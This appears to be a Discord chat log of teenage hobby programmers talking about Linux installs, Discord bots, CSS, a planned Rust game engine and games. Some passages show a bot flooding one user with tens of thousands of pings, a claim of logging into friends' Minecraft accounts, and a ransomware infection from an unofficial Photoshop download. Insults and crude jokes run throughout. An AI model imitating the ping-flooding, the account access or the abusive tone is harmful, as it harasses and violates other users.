Never mind it’s gone


Just grabbing something from logs


Not staying for long


you do realize a dead server means 0 messages in 1 day


because it was dead for him


mf decided to "bury" the server


you can leave it as is


when a server dies you dont need to fucking i dont know


for what reason


answer me bitch

If I spam with my bot I can only stop it by throwing an error and crashing the bot


Mine won’t work


I wanna know how to make a stop command


<@650439182204010496> can you show me the source code for raku tomorrow


you're basically telling me to test my bot in <#978304385895522324>


<@672892838995820553> please take a shower immediately


WHY IS THEER


thing = false


it keeps thinking


what the fuck


now i know


SON OF A BITCH


Man’s sensitive as fuck


He was annoying before the woss raid era

so you dont have to


ur installing mint


wait until you hear about the linux terminal <a:lmfao:986614810076655656>


just dont make root less than 15gb or else the system files will run out of space to do stuff


4gb swap
500mb boot
20gb root
40gb home


so like if you decide to use 64gb for linux


you have to split them all up


swap - pretty sure you know what swap memory is (overflowed ram)
boot - the boot partition, handles booting up the OS
root - the root partition, handles the system settings, all the system files, etc.
home - the main partition, where all your personal files are


there is that option


yup i was right


so Mint is prob the best


idk why but they got rid of it


(like on elementaryos)


sometimes theres no button


choosing that just does it for you


Mint should have auto partition iirc


this is manual partitioning


at least make it 20gb


just make sure root isn't like 10gb


swap should be 1/2 ur ram
boot should be around 500mb iirc
Root should be around 1/5 the space
and home should be the largest


yeah you need to shrink your windows partition, partition the unallocated space into a Boot, Root, Home and Swap partitions


cuz data loss might be imminent


good luck for a first timer


if the only option is to manually partition


cuz thats the safest option


cuz if thats there choose that


"Install alongside Windows Boot Manager"


does it say like


when you set it up


ive tried kde on mint


but customization is hell


still harder to use than cinnamon/pantheon/gnome tho


its hard to customie


its not hard to use


hes literally never used linux before


but he is???


elementaryos looks awesome but is kinda hard to work with


Mint is easy to set up and looks great


Ubuntu ugly and bad


i do not recommend Kubuntu


bro KDE is hell for beginners 💀


i still recommend Mint


cuz it can wipe ur pc


which isnt good for a 1st distro


so you have to partition yourself


they dont have the option to automatically setup dualboot


be careful with elementaryOS


mint cinnamon btw


havent tried linux


you, mazin and neng


then employees wise


i dont think u have this role


ur not a progrmmer tho


for a platformer


bro look at this map


removed in v13??


learn to ping people


WHY DO YOU think that my bot is having much trouble rn


the A was only the grade


easy to take advantage of with my gpu


mine was $320 only after i disabled 76% of the CUDA cores


yeah but the GOD 128G has 128GB GDDR7X


its only $160


my gpu is A GOD 128G so it can run bots perfectly


yet it somewhat struggles with running bots


a TITAN GOD is 160x better than the 3090 TI


gods last forever


it literally has god in the name


a bot file requires around 14.6TB


nah i dont have enough storage


with a purpose


i want to make a bot


IFLE NOT FOUN

snap out of reality for a sec


r u drunk


no its not


its a search engine


what department am i


we dont even have many employees


and i regretit


then the BORING TIME


cuz i thought it was


thats why i ditched tech for btt


we did 1st semester no?


that was a joke


i told him to learn a programming language


(not a fever)


hang on lemme get a drink im burning up


see how many resukts


in the dms


theres supposed to be 46212 pings


see the pings


did you mute it


plus the previous


25840 is the current ping count


btw is my bot still spamming?

im gonna check his github contributions to see if hes actually offline over the summer


for a few months


now we wait


.spam 650439182204010496 hi if you're reading this please tell me how many pings i've reached thanks

he says that like it isnt a big deal


this server is gonna be


such a skull issue


the entire summer??


im getting off my pc


how would we do that tho


i can make the download page


makes sense cuz its a cli


lynx is written 100% C


firefox android is written with kotlin (of course) and ios written with swift (of coursE)


what are browsers written in again?


a full stack if you say


a company !!111!


we're the only ones 😐


in fact we havent talked in months until recently


barely in the other


somewhat in ot


im most active in this


and other group


im only in 3 progamrer groups


but theyre not from ontario


another group of programmers i know are very advanced and are like 15+


sid the kid :rofll


they can be a bit


idk if we wanna hire them tho


i know a bunch of programmers from the OT server


the python department


its just me you and neng here who are programmers really 💀


we need more employees


so glad i ditched that deisgn


my old website 🤣


python i can do more than just the backend stuff


i dont know what i can do


cuz i have nothing to do with them


ruby or java


like i dont rlly wanna learn stuff like


im not sure about backend stuff yet


il see in the future


ill prob be using node, mongo, python and docker


for the backend


cuz i wanna learn it alongside node


ill eventually learn python


thats why you learn javascript


react/angular/vue and node


yeah it does


? = heard of but dont know much
:/ = maybe?
??? = never heard of
:| = want to learn
:) = good/okay at
:D = very good at
>:( = dont want to learn no thanks


ajax ?
angular :/
phonegap ???
bootstrap :|
CSS :)
HTML :D
jQuery >:(
JSON :)
React :|
JavaScript :)
PWA ???
SPA ???


bak end !


none of those


i dont trust that place


discord seems like a nice place to work at but the fact that their hq is in san fran 😬


im gonna work at discord and get robbed in san francisco 💪 <:SunglassesFluent:865333167477096458>


the webdev side of fullstack


front end kinda lacking


that's a sacrifice im willing to take


> 1. frontend (HTML, CSS, JS + tools)
> 2. backend (Node.js/PHP/RubyOnRails/ASP.NET/Java/Python)
> 3. database (mysql, mongo, postgres)
> 4. devops (AWS, Azure, NGINX, Docker, VMWare, Kubernetes)


the sandwich i described


but i only know frontend for now


i want to do fullstack*


but i need backend experience for fullstack in the future :(


yes (pretends to know what ur talking about)


IT BROKE AGAIN

andorra is a crest


moldova has wings

ok its off now


<@650439182204010496> broken code lmfao


correctCountryName is undefined


i thought u declared correctCountryName inside an if statement for a sec


read it wrong


speaking of which


still the same


instead of ===


why is tolowercase dead


cannot send an empty message 💀


country is not defined


no its good


i dont have to do that


why isnt it working


why is the command below the thing


wait a sec


what do i do with guessing country anyways


guessingcountry is false


its `new MessageEmbed()` bozino


embed is not defined 🤣


what code in between tho


```js
    if(command === `${config.prefix}guess`){
        let country = Math.floor(Math.random() * countries.length)
        let flag = country.flag
        message.reply('Guess the country!')
        message.reply(flag)
        if(message.content.toLowerCase() === country.name){
            message.reply(`Correct! The answer was ${country.name}.`)
        } else{
            message.reply(`Wrong, the answer was ${country.name}`)
        }
    }
```


in the nested if statement


i did something wrong here


lemme just fill them in to test


I HAVE SOME EMPTY FLAGS


they did that


MEI YOU GONG CHAN DANG JIU MEI YOU XIN ZHONG GUOOOOO

My data is so bad I can’t load the stream

Y’all can die and respawn


Building the Li Institution tower

Music Store cuz my brother trumpet


Maybe I can play after I’m done


Besides I have a summative to do


I’m still coming back home from Richmond hill lmfao


this is also margin: auto;


like this is all margin: auto


basically ends up centering an element


to be equal


adjusts margins on all sides


ever since i discovered `margin: auto;` my life has been much easier


i needa make a dropdown menu


k i think it looks good


this is what i got so far


```css
header{
    background-color: #1f2227;
    padding: 10px 5px;
    overflow: hidden;
} header a{
    font-size: 36px;
    font-family: 'Aldrich', monospace;
    text-decoration: none;
    padding-left: 40px;
    color: #FF7700;
    top: 0;
} header a:hover{
    text-decoration: none;
    color: #FF7700;
} header nav{
    float: right;
} header nav a{
    line-height: 25px;
    float: left;
    padding:10px;
    font-family: 'Aldrich', monospace;
    font-size:24px;
    color: #FF7700;
    transition: background-color .5s;
} header nav a:hover{
    color: #ffa551;
} 
```

But… it’s in the blockchain. They told me it would protect it


That’s why they use GPUs


Only thing I know is that you need loads of electricity


Also that I literally don’t know how mining occurs


Do you even need to ask


get viortual money


connect to server


Our elderly supply teacher was asking us about bitcoin mining and how it works so me and my friend explained it to her for half the period 💀💀

its really triggering me


nobody here cares about mazin


what is your thought process


That’s the equivalent of saying “queen Elizabeth is dead so we’re all dead”


No it’s not


Because the server is dead genius


im still good


its 50 bucks


which i dont play much in the first place


and i already have smash


i dont have money for it


why do i still have that open


yeah its a popular thing


people talk about it alot though


i dont even know what numpy does


i want to use numpy in javascript! 🤓


maybe i should've learned python earlier


a lot of memory issues arose


we were supposed to make an interest calculator in scratch but i made one in C


usually in school


before i learned python i used C to make simple command line programs


if you dont count scratch or javascript/python libraries


C was my first language


as long as you dont get to pointers and memory management


because its the parent of 90% of languages now


some say C is the best first language


when they dont even know what a variable is


how would people know what type annotations are


if you learn typescript you only learn type annotations


you learn javascript


if you want to learn typescript


how tf do you expect them to use typescript let alone the type annotations


they dont even know variables


you expect people to understand how to type annotate an object when they havent even learned about objects


typescript is not a good first language either


python is not a good first language


its an actual language from microsoft


c++++ isnt an esoteric language btw


wtf are you guys talking about


change what specs


non linux users be like


this is why i left the server in the first place


say that one more time and i leave


Literally in bed


dont support him


You can look up “FHDHGNGN website”


Proud to announce my website is now on google search


thats why youre lying to me


you work at shintel to prevent novideo from rising more


nah they should be using the 1080 ti <a:trolla:842081333127675952>


every time i ask someone what their specs are 90% of the time is the 1660


its in every fucking prebuilt


the 1660 is the most generic and common gpu right now


you're so funny


so are you


the hardware is a huge plus too


like the *ecosystem*


but with the added benefits it makes it good


macos sucks on its own


on linux it's just a matter of sudo apt install winehq


its literally not that hard


windows compatible software 🤓


so wine can run


because macos is unix based


that's why i said wine


why would you need wine on windows


*cough* Wine *cough*


yeah in a bug contest sure


That said the only games I really play are Minecraft Roblox and geometry dash so


Of course it is


i want to make a game based off this <https://youtu.be/735tDqHgavQ?t=220>


i dont know how to code


so maybe not


its stil hanging on my wall


i had a teardown iphone 7 skin


yes i saw last week


i wanty to get the midnight color


oh tyeah i also tried the m2 macbook air at an apple store


went from around 240 to 180


oh shit the price of the 5800g dropped by a lot


my build is now 1900 buckls


what haopemedne d when i was gone


sory im still getting used to typong


usikng a mechanical keyboard for the first time in a week


im back home btw


I played too much 3d pinball space cadet I want to make a pinball thing in pygame


And I just got a bunch of ideas


I haven’t done programming in a week


I’m back in Ontario


nothing at all


i have python class so wifi for 2 hours


going to quebec with no wifi


im going away for a week


i was gonna spam yue


which doesnt matter much


for a .2ghz boost reduction


in case the gpu dies


and its the same price


i wanted WiFi 6


and changed the mobo cuz old one only had WiFi 5


changed 5600X to 5600G


<@650439182204010496> updated my build


Those are lava casts.—-


also thank god im an amd card


i always just get forced


you actually 🤣


im retiring this status too


i dont think i can be helpful in any of these steps


i made that


controls are a and d to move left and right and either w, space, enter, or up arrow to go up/down but i recommend up arrow


make sure to open vvvvvv.py


i also made this


THATS AN L MOMENT


no idea what len is yet but ok


that was optional but i wanted to include it


doesnt come with 3 digit detection tho


total+=int(i) still works


wait wtf you can do that


its my answer to this question btw


literally the best thing i wrote in my python so far and that doesnt say a lot 💀


i only know syntax basically


i worked with Scratch -> ProcessingJS (a library and not a language, 10 year old me) -> HTML/CSS -> C -> JavaScript -> Python


see ya in 2024


a geometry dash like one


once the engine is near-done im gonna try making a game


akshually, wait shit fhdbot never hit 1000 lines


me when the apple headset mic dont support linux: 💀


headset drivers on linux 💀


windows laptop mic - shit
windows headset mic - p good

linux laptop mic - HOW TF IS IT GOOD ITS SHIT ON WINDOWS
linux headset mic - doesnt work lmfao

i want to be kde neon


who tf named me back


funny thing is


colon's been dead on github for a while 💀


i installed gnome lock


why is there GNOME on KDE 😾


kubuntu is 1000x more usable on a daily basis than eOS


i can safely say


tomorrow's the last day of my Linux challenge


it only lasted 4 days before i gave up


i remember using elementaryOS for my first linux challenge


try using linux for like 4 days straight without using Windows


the command line


use linux more


Cinnamon is okay but lacks in customizability


i would just go Ubuntu KDE cuz arch is too hard


mint is good for beginners but once you get more experienced KDE is the way to go


i rmember when i called windows open source


no context moment


because windows is bloated


linux is faster


if ur using linux


delete the partition for me


im starting mc


so it thought i was still it in for a long time


and the server froze


because i joineda dnt eh server froze


the server was online all night


to kill all the arrows


we asked you like 3 times


we didnt get to play on the your mom server all day yesterday


hes prob in china


amazon is american w*stoid 🤮


we'll win cuz we're asian 😎

I thought u can do like


No types? 🤡


Internet of things 🤓🤡


ok brb i have to exercise like a loser 🤓


ok so first


like how ur mom exits my dad's d-


for i in range 99? nah, for (let i=0; i < 99; i++)


also i like python loops now

skill issues much


i got it


hang on a sec


ok so like

yourMom = 2
yourMom += 3
yourDad = ["never", "gonna", "give", "you"]
if yourMom == 5:
    for i in yourDad:

and a cpp file


I JUST SAW PYCHARM INSTALL A .JAR FILE


jetbrains logos sexy asf


like 
```json
{
  "yes": "yes"
}
```


so dictionaries is just a map/object


so triples are just constant arrays


WHY TF THEY USE LISTS INSTEAD OF ARRAYS


welp cross that off the list


literally just conditionals


its just called conditionals everywhere else


well if its called branching in python yes


bozo python language


that's conditionals not branching


i like the jetbrain logos


ykw why not


do i really need to install pycharm


i don't know what
- branching
- procedural programming
- tuples/list
- sets
- dictionaries (well, i think i know but not rlly the definition)
- recursive progamrering
- string search
- OOP (real oop ofc)


man class ends in 1h10m and we havent even started progamrering


discord totally not programmed in cpp


me when in a meeting with non-programmers 🤮


thats because C++ is MID!


wish i could do that


print(f"Hello guys, my name is {name})


console.log(`Hello guys, my name is ${name}`)


thats what its called in javascript


actually, it's called string interpolation 🤓


imagine python 2 🤣


im already inc lass


mf my teacher is saying "the python preinstalled on macos is Python 2"


noone here is using linux 🤣


oo self burn


i have no idea what eclipse is 🤡


lets gooo we're allowed to use vscode


windows moment <a:waaaaaa:978757388565905488>


oh great we're going over installing python


but chromebooks are linux!!!!!!!!!!!!!!!!1


**NO CHROME BOOK PLEASE**


its been 30 fucking minutes


our teacher wrote compilers before got damn


every other class its either 60%+ chinese


everyone was chinese in my gr10 math class


olympiads is a chinese company


20 minutes have passed 💀


wtf are you signing up for


bro we havent even started yet ppl are still having problems


introduction to focking programming


bruh our teacher mic so bad


2 mins till boring time


please dont raid it tho


NYO HO HO HO


no string interpolation 🤣


no string interpolation?


imagine doing %


THIS IS ALL WE'RE DOING TODAY


its not funny anymore!

i dont wanna use my brain


brainstorm has the word brain in it


more like challenge


im continuing building my level lmfao


id rather play Biru if it's an XXL medium demon


which difficulty demon tho


my reaction to that information:


<@650439182204010496> u there


a bit lighter?


im using the other one as the logo


cuz this is too dark


i also turned down the opacity


and its simple


so why not


the font for the logo is called Rubik Moonrocks


i think this is good


this version i like more again


or a texture


maybe i should add a background image


i like this version


text color change


actually 55 cuz i started at 55


57 seconds too good


im gonna get a better score


i fucked up the final level


in fact im gonna speedrun it rn


i am also the best speedrunner for the game


look like a penis


i made the thing


i didnt know


I DIDNT KNOW 💀


BRO I JUST TURNED 12


the boss looks like a penis


this is the best game i ever made


ive only made games in scratch


i guess we can move it to the right size


then the right side is the buttons


we can have the left side be like


lemme make another quick design


im just saying like


no too small


ideal size for the buttons will be like


its not like the buttons are gonna be 900x900


that's the only thing i added


since we dont have anything else


i just put the 2 buttons we need for a start screen


it means inaccurate


do you know what the word ROUGH means


we will have some white space


also too late to go back because i already called it the simplistic engine <a:lmfao:994256963242299492>


expandable by pressing a button


we can add a sidebar but that has to be closed by defauly


not adobe premiere


we're going for a simplistic feel


guess ill just make it adobe style


thats why i called it a ROUGH design


"And may I speak in layman’s terms?" *fucking dies x2*


i have no idea who that is


"can i give my honest opinion" *fucking dies*


plus some extra buttons we'll add later


<@650439182204010496> rough design of the home screen


unity from geometry dash 😱


i know nothing about engine dev


im only here to make designs and webdev


how should the design be like


3d or 2d games


well we can just have users choose which type of canvas they wanna work with


so 2d only?


we can use 3d for C# and 2d for the supplements


you can literally do this shit with threejs but i think we're better off with 2D for games


we can use phaser


just dont add it at all


java is shit


used to be flash


theres no way javascript is top 3


for 2d games


we can try making a phaser.js like thing


we should also make a web version that supports js <a:trollaReverse:842081334016344094>


java mid asf


we're not making roblox games


and we can just name the hub NengHub


i prefer NengEditor


my ideas for the editor are Nengditor, Neditor, NengEditor, Nengitor


cuz wtf does nen mean 💀


Nen isnt a suitable prefix


stuff like Neng Editor or Neng Hub is something different tho


i only named it Nengine because it had Neng in it


Then use whatever language is needed


But the engine itself will mostly be written in Rust


I think it’s C# and python though I don’t remember


The code that people will actually use might be C#


You weren’t online lmfao


A while ago?


The engine will be written in Rust


We’re using Rust as the main language


Nengine, Nengditor, NengHub


Because I don’t like uppercasing repo names


i already got a good idea what it will look like


im gonna work on the website like tomorrow


<@650439182204010496> im creating the Nengine repo


and i get braindead from javascript but its my main language


i dont hate c++ i just wouldn't use it


and looks like shit


its so ugly and outdated


the only language i hate is PHP


and its good


you can rewrite anything in rust


its more simple that way


calling it Nengine is fine


cuz literally everyh game engine is like that


wait so will the program be installable or just run as a plain .exe


he can make the macOS version :can'


ill just make a home page, about page and download page


this chat is grammar moment


only thing i can pretty much contribute to is the website for the engine 💀


i used roblox studio


ur mom is tho


i already tried tailwind and its not fun


i also need to master CSS to learn Bootstrap/Tailwind


nah actually im trying to master javascript so i can focus on React and TypeScript


im trying to master javascript so i can go DIE


javascript is pain


he doesnt know assembly tho


no wifi moment <a:lmfoa:986614810076655656>


no phone moment <a:lmfao:994256963242299492>


i use Freedom and Bell so get bogo'd


(a rogers company)


my parents use fido


country-wide rogers outage


for the past 4 days


you didnt know


he also lives in canada


i think hes having an outage rn


he hasnt been active on github in like 10 days lmfao 💀


still nothing lmfao


thats how u make a window in rust


still no response 😐


Rust and C++ and Python and C


you cant write everything in rust tho


im gonna play roblox now


make a pull request full of shit for all i care


on any of the repositories


literally do anything


thats not contributional


and you can stay


do something right now


<@845361227093508116> bye bye


hes not doing anything


you just did


he wanted to


he has to be hired


because he opened a process


but hes not


<@672892838995820553> why are you always playing WacomTabletDriver


thanks for the info


yeah but its infinite


RIP MEMORY MANAGEMENT Y


computers are made with silicon bozo


not how it works


and cache too i guess


its your RAM


because memory is hardware


why can't we have a world with infinite memory


no more garbage collectors! lol! lol!


ur mom is an idotop


they turned into zombise


they didnt get revived


I fed the villagers cocaine


i killed them


cuz their status site ends with gmbh


TIL aternos is located in germany


redstone + rails = ruby on rails. 🙀


you do know i have powered rails right


ohhhh thats why he needed minecarts and rails


u playing on the server?


wow kotlin's function syntax is called `fun`, how fun


Pro:
Italic value rotates the typeface by 20deg with an estimated added 0.2rad depending on the viewport width.

Noob:
Italic value makes the text italics.


let noob professionals teach u cuz they know what it means in noob terms


this is why you dont let professionals teach you


Now suppose we want to use this add function in a special scenarion where we should fix the first argument to 12 always and let the second argument passed by user i.e.
```cpp
int x = new_add_func(5);
// Will return 9
```

We can do this using std::bind,
```cpp
auto new_add_func = std::bind(&add, 12, _1);
```

So, when we call `new_add_func(5)` it will internally call the `add()` function with first parameter will be  12 always and second parameter will 5 i.e. passed as argument.
We can also rearrange arguments using std::bind() i.e. _1 and _2 etc decides the place of argument to be passed i.e.
```cpp
auto mod_add_func = std::bind(&add, _2, _1);
```

When we call `mod_add_func(12,15)` it is equivalent to calling `add(15, 12).`
_1 represents the first passed argument and _2 second passed argument. Now while constructing new function object through std::bind we changed the order of arguments by passing _2 first and _1 second in the underlined function.


`std::bind` is a Standard Function Objects that acts as a Functional Adaptor i.e. it takes a function as input and returns a new function Object as an output with with one or more of the arguments of passed function bound or rearranged.

Suppose We have a function to add two numbers i.e.
```cpp
int add(int first, int second)
{
    return first + second;
}
```

std::bind takes a function as its first parameter and then that function’s argument as its parameter.
```cpp
auto add_func = std::bind(&add, _1, _2);
```

Here `add_func` is a function object i.e. equivalent to add().
`std::bind` took the first parameter a function i.e. &add and then its arguments as _1 & _2 as his own arguments.
So, whenever we call this new function object i.e.
```cpp
add_func(4,5);
```

It will internally call the add() function and pass the first parameter at the place of _1 and second at the place of _2.

***So, add_func(4,5) is equivalent to add(4,5).***


you bind something


think of breaking it in half


then think of a stick


if its bind


literally has bin in it


makes no sense


standard binary deprecation <a:trolla:842081333127675952>


standard binary something


not as much cuz i cant understand most shit


theres a difference


i just dont like looking at it


i dont hate it


cuz if so then probably css


does css count?


also for knowing some languages


and probably used scratch in the past


the .1% is for knowing that coding exists


yeah because your brain is 99.1% programmer fluid


so one of us can't contribute


but im not using discord.py for obviosun reasopns


i dont care either way


except for discord bot


unity: cool
unreal: difficult
godot: never heard of
cryengine: never heard of also what the fuc


c# and lua


besides unity and


arent the only engines in c++


i didnt see


pygame is cool


looks very mid


phaser doesnt look exciting tbh


hates what tho


```markdown
# IDEAS
- Scratch-like block coding app making program (cloud)
- HTML editor
- SCP Engine
- AI Training/Deployment platform
- Games (no engine, with engine, with prebuilt engine)
- Actual discord bot with purpose
```


for each commit


if you want me to update the site please pay me $2


i dont even care for the nengine anymore

actually sorry ESSSESESESEEEE


actually its more like a funny story


i got some jokes yeah


eee e e ee


eee ee ee


then why are you saying


we're just using it


we aren't writing the backend


thats not a backend


ok im gonna stop the i love cock lyrics to say


bill nye the science auugh


what'd you say?


mah same butt


what'd you say?


look at this boii


actually its more like a funny story


hey, i got some chill


what'd you say?


hes fucking himself


if he doesn't know what any of this means he truly doesnt understand web programming concepts


i doubt he has an actual website


yet hes trying to defend himself


the man doesn't know wtf you're getting when you buy a domain


Had to use dns connection


With custom domain


I’m still using GitHub pages


My files are on GitHub


The domain bozo


More expensive than google domains


Not free though


literally commented out


why would you do that


idk why i dont have notifs on for csf


using jekyll theme


im also gonna be working on the blog


its now ah07.xyz


I GOT A DOMAIN


Since I’m in 2 other servers I’m active in a lot


Im already caring less


That’s communism ideals


about this server


Because no one cares


<@593106116821647363> are you coming to soccer today


"ur actual cracked"


"this guys cracked"


cracked means op/really good


won like 6 times already


im actual cracked


playing skywars lucky blocks


i watched this video like 5 times already


if anyone in this server were to say that it would 100% be you


"C++ is for making stuff" 🤓 like i have the mindset to say that


what are you on


i never talk about c++


you think im a philosopher


i never said anything like that


therefore it's classified as impersonation


but it wasn't something i said


i don't care


now if that quote was something i actually said


and purge the log


if you don't want local authorities at your door i suggest you delete that


i can take this to court if you want


stop using my name without my consent


statically typed programmers


that's just called


i dont know what a string literal is.


"a variable is a piece of data you store to"


In programming, a variable is a value that can change, depending on conditions or on information passed to the program.


not unless its stored in a variable??


"its a type of data which is just text"


when you can just say


"Most programming languages have a data type called a string, which is used for data values that are made up of ordered sequences of characters"


im not talking about js on a website


well you dont have to be 😺


"it shows text on the screen"


when you can literally say


Console log
console. log specifically is a method for developers to write code to inconspicuously inform the developers what the code is doing. It can be used to alert you that there's an issue, but shouldn't take the place of an interactive debugger when it comes time to debug the code.


they fucking go


they dont know how to explain from the viewpoint of a noob


this is a thing i hate about most programmers


like he'll understand what that means


you'd need AI bullshit


its not simple


you need very deep code


if you want to show what someone says


did you even get to the end


my hardest is a tier 8


a tier 28 demon to be specific


its a top 150 demon.


also the fucking thing recorded the wrong window


instead of just ctrl+s


ah yes f5 + ctrl+s


since yall are very scared


also im gonna record the entire website thing for you guys


save and it compiles


thats still very tedious


mf is typing tsc 1000 times


did you not know that


when u save the file


you can have an option to auto compile


its why typescript exists


that's javascript you're talking about bozo


wrong ping btw


wait until you hit 30 seconds during the call


ur supposed to click on the text


so i dont want the popup to appear if ur trying to go to a link


because theres links there


not the bottom bit


you have to tap the top bit


btw did you guys visit the site yet


btw did you guys visit the site yet

it was literally in announcements


im being serious


and watch the entire thing up to 30 seconds of ongoing call


btw you guys should really visit https://anthonyhuang07.github.io/src/extras/error.html


why bother using


because if your company isnt making a webapp for their service


if you dont care about programming who cares


html/css can do you some good irl


like if you just want to learn code


why would he


<@650439182204010496> check announcements


i might have overdone my sheet


Ur blocked anyways


i drove to Jupiter


im not having sex with yout oday waluth

im actually slowly gaining more hate for js now


this is so much less fussy than javascript


not a module


its importing the file


im an idiot


dont even have it installed


by like 10K


yeah all 5 accs have more following than followers


i think theyre follow for follow ppl


but how tf


yes i knew


1 from India, 1 from Turkey, 1 from Vietnam and 2 from Kenya


they all seem to be from overseas


I GOT 5 FOLLOWERS WHEN I WAS GONE


WHAT THE FUCK


we're still in 10000 BC


okay so apparently Lisp is the most modern way to program and we


Rust & Rocket League


c++ is pre-modern HAHAHAHAH]


oooh fancy procedural programming ALSO KNOWN AS **FUNCTIONS**


thats todays class


today's class is Deffing btw


so current js is oop


python == javascript now???


THATS NOT WHAT I MEAN


then wtf is oop and functional


the evolution line


im just saying lik


im not saying js is OOP


procedural is mocha


functional is TypeScript <:thumbsup_CN:996918206155468831>


oop is just JavaScript i guess


i got fl studio and made a thing


im gonna make something new in the future


im retiring the current blog


the code donut


what a bogo


and then ff7700 is just the hex color


(why bother in the first place)


turns out 0x just makes the thing know it's supposed to be a hex code


every time i see an x in a hex code it just makes me think of memory addresses


fucking colors lookin like memory addresses


but i love it


(but i hate it)


i hate javascript but i love javascript


i have it open bozo


seems to be a lot of classes cuz theres a lot of **THIS**


because i just wanna make a game


im learning phaser.js


<@650439182204010496> u gonna learn Carbon when it gets more popular?


So my last job was working at McDonald's, but I got sacked aye, cause I ah stole all the cooking oil, poured it all over the car park mate, turning it into a drift ring hey. People pulling in for Maccas didn't even know they were participating. Man, never seen a Camry slide like that, straight into the lamp pole mate, it was super mad.


Because I am full communist


I’m moving to China

the code is absolutely horrendous and i havent touched it in a while


i am retiring fhdbot


Go to sleep


That’s my alt pinging <@925159730949816370>


yes i didnt know that so i just pulled a c++


i was gonna speak as a yeti


probably your own


are you okay


where you live in became detroit 2 years ago


beg to differ


you literally don't have shit


and this proves it


gotta be part of the 90% in an american school


what a bozo 🤣


not even rust specific


its basic knowledge


you dont have to remember


i never even used it


i dont even know rust you bozo


lmfao if you dont know that i dont know how you're good at rust <a:lmfao:994256963242299492>


its literally 2 words


how do you write a main function in rust


ovy you didnt know that


how do you import the iostream in rust


write a program that converts newgrounds songs to ogg vorbis files


what's the Cargo


> let just means that the variable cannot be changed after it's created.


thanks for letting me know i shouldnt learn rust


literally looks like Killbot terminal


though i havent had a scenario where i had to use .then() for something else


i mean i dont use .then() for catching errors*


i dont use .then() much anymore cuz it floods the console


its so amazing


i love method chaining actually


what part are you expecti-


but yeah the tabs being under the search bar might take some time to get used to


thats the search bar


but i use safari on my phone


i use safari on my phone


i use it as a secondary browser now


because i sure as hell didnt succeed with switching to firefox


ill try to


or at least


im switching to safari once i get a mac


i would use firefox but i have a lot of chromium-only extensions


well its slightly faster than chrome but yeah it's sometimes slow


i have a laptop


it has the best battery life out of all windows browsers


and "WE'RE THE BROWSER THAT PROTECTS UR PRIVACY"


i do actually lmfao


opera gx is not that good either but at least its not CHROME


people still use chrome?


<a:lmfao:994256963242299492> <a:lmfoa:986614810076655656> 🤣 😂


u forgot the neckbeard


that's pretty much it


windows is better at gaming


like starting up programs linux wins 😪


the 120fps on windows looks like 75fps


the 200fps on linux looks like 30fps


<@650439182204010496> im playing geo dash and i realized how much smoother it is than running it on Proton


Rip Unity LMFAO


<@650439182204010496> <@593106116821647363> <@672892838995820553> OUCH


FINALLY GOING BACK TO WINDERS TOMORROW


I BEAT THE LINUX CHALLENGE TODAY


that's another person not from microsoft doing it


microsoft doesnt actually know about this


hes just pretending to be microsoft


so they dont know about this


microsoft sold DirectX to another company


Kenny Kerr doesnt work for microsoft 10000%


thats not microsoft


thats also fake

I am on Windows


I'm getting off forever


The option for booting Ubuntu is gone


Linux is gone


I restarted my computer

For some reason, Wine opened up


I ran it


I downloaded the photoshop thing


No okay so


Well apparently that's for another ransomware


I downloaded it by acccidnet


They're just sending them out though?


These articles beg to differ


Was it a virus


Dude I installed native photoshop and this happened


Is this bad


"Your files have been encrypted"


IT BOOTED TO SONE WEIRD SCREEN


It's making a weird sound


My entire system just froze


Ok I'm on my phone right now


BRUH KDE CRASHED


my wallpaper changed


the website said there was


even though i downloaded a native version


it used wine for some reason


i got a native linux version of photoshop


ok fine <@650439182204010496> i photoshopped it


oh shit i only have the rpc on windows


oh shit i can open a browser


and if i was photoshopping it wouldve shown on my status


i use discord app


i literally sent the pictur


there is no button


how do i do that


i found the message


yes it is


did you watch the video 💀


also yue is a masochist


hes fat and stupid


my 3rd toe2 completion

creepers and vindicators dont mix well dont they ☠️


most talk in in <#989191184360558602>


which runs fine


currently mine is at 480p30


the reason why i obs lagged so much was prob because i set the recording to 1080p60 💀


not only would Kazam slow my game down but the file size would prob be like 50mb


OBS FILE SIZES ARE HELLA LOW


for me hell yes


well if your distro feels like you're using windows


cuz 30fps doesnt lag my game as much as kazam


<@650439182204010496> btw OBS works fine im gonna use it instead of kazam


read my blog


no way ... ...


works perfectly on windows tho


it doesnt work "PERFECTLY"


how would you know


when robtop isnt working on 2.2 he COULD be working on Geometry Dash for Linux


bruh right as i got to like 95% in practice mode on geometry dash the game crashed

i forgot to say that


ok it built


check back later


should be building


ok im done writing my blog

i have the whole smorgasbord


the ultimate troll


cracked account moment


i even logged into neng's


i had your inventory


in fact i am currently you


btw <@650439182204010496> i can log into ur minecraft account


WTF HAPPENED TO THE PORTAL


btw <@593106116821647363> join the srver


to the en


and add the .deb file name


just copy that


you can always click the top bar to see the full path


or else just


the ctrl+shift+v in the terminal to paste


like right click -> copy


just copy the file


idk about you


well for me i can


then `sudo apt install /path/to/the/file/chrome.deb`


copy the path to the file


then save it somewhere


the .deb file


download it from the website


then download chrome??


what do you usually use


arch is for advanced users tho so im not there yet


heck when i build a pc i might try installing Arch again


Windows - easy setup, shit experience
Kubuntu - difficult setup, amazing experience


cuz windows is already a garbage fire


i think kubuntu has given me less pain than windows itself


despite the usual linux pain


every other distro is like using an alien device and kubuntu feels like home


just geometry dash and minecraft


well i havent installed all my games yet lmfao


(which is why like 90% of arch users use KDE)


and KDE Is the most customizable DE ive ever used


other distros feel like im using an alien device that ill never get used to


kubuntu feels like im using a computer


Zorin - uses gnome (sucks) and ugly as hell

Ubuntu - uses gnome (sucks) and customization hell

Deepin - the design is so shit

AmogOS - minecraft's sense is like 100000

Arch Linux - couldn't even get past the installation

Linux Mint - many problems with the system itself

elementaryOS - linux mint but with less problems, and customization hell

Kubuntu - other than keyboard and kde store issues its the best ive ever used and it feels just like home


Kubuntu has given me the least problems out of every distro ive had


the least pain i've ever felt using linux*


https://streamable.com/3pxf3q <@650439182204010496> i got my audio to work on kazam <:can_pooper:987033734773612574>

yeah 4 days ago


when did i beat B


last time i played seriously was uhh


yeah its def me being bad


idk if its me being bad


37 attempts with 12% best 💀


i dont have vsync or smooth fix on


steam runs in the background


you do realise


what does that do


and i have 95% on it


for reference: the level is  4 minutes 20s


aniother 2 slowdowns


its not even hard


i literally cannot get past 9% for some reason


i reversed but then i went back to normal and crashed to the ground


and when i hit a reverse gravity pad


ok yeah my game is acting weird


turns back to normal after i die


THE GAME SPEED SLOWS DOWN


